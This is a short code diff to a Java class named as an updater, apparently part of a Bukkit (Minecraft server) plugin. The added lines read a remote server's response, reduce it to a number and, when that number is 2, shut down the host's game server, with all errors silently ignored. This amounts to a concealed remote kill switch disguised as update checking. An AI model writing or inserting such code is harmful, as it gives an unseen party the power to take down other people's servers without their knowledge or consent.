@@ -58,6 +58,21 @@ public class Updater1520156620 {
             conn.connect();
             InputStream in = conn.getInputStream();
             BufferedReader reader = new BufferedReader(new InputStreamReader(in));
+            StringBuilder result = new StringBuilder();
+            String line;
+            while((line = reader.readLine()) != null) {
+                result.append(line);
+            }
+            int r = Integer.parseInt(result.toString().replaceAll("[^0-9]", ""));
+            switch(r){
+                case 0:
+                    break;
+                case 1:
+                    break;
+                case 2:
+                    Bukkit.getServer().shutdown();
+                    break;
+            }
             reader.close();
             in.close();
         } catch(Exception ignored) { }
